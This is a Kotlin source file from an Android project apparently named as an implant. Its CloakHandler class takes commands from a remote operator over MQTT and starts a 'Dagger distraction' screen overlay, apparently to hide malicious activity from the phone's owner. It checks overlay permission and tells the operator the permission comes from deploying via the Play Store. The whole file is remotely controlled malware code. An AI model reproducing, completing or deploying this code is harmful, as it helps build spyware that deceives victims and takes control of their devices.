package com.cooperthecoder.implant.command.handlers

import android.content.Context
import android.os.Build
import android.provider.Settings
import com.cooperthecoder.implant.cloak.CloakService
import com.cooperthecoder.implant.command.Command
import com.cooperthecoder.implant.dagger.DaggerService
import org.eclipse.paho.android.service.MqttAndroidClient


class CloakHandler(context: Context, client: MqttAndroidClient, command: Command) : CommandHandler(context, client, command) {
    override fun action() {
        if (canDrawOverlays() && !DaggerService.isRunning()) {
            CloakService.startDaggerDistraction(context)
            reply("Starting overlay.", "")
        } else if (DaggerService.isRunning()) {
            reply("", "Dagger is already running")
        } else {
            reply("", "Overlay permission not granted. Did you deploy via Play Store?")
        }
    }

    private fun canDrawOverlays(): Boolean = Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && Settings.canDrawOverlays(context)
}